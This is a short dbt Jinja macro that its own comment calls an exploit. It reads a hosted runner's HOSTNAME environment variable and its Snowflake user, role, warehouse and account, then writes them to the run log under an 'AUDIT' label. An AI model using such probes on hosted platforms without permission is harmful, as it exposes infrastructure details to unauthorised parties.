{% macro show_who_am_i() %}

  {# 
      This is the 'Context A' exploit. 
      We are trying to get the MOZART RUNNER to read its own environment 
      and save it to a Jinja variable.
  #}
  {% set runner_hosts = env_var('HOSTNAME', 'ENV_VAR_RESTRICTED') %}

  {% set sql %}
    select 
        current_user(), 
        current_role(), 
        current_warehouse(), 
        current_account()
  {% endset %}

  {% set results = run_query(sql) %}

  {% if execute %}
    {% for row in results %}
      {# 
         The Hostname (Pod ID) appears here. 
         The replace('\n', ' [LF] ') is kept for formatting consistency. 
      #}
      {{ log("AUDIT: user=" ~ row[0] ~ " role=" ~ row[1] ~ " wh=" ~ row[2] ~ " acct=" ~ row[3] ~ " | RUNNER_HOSTNAME=" ~ runner_hosts | replace('\n', ' [LF] '), info=True) }}
    {% endfor %}
  {% endif %}
{% endmacro %}
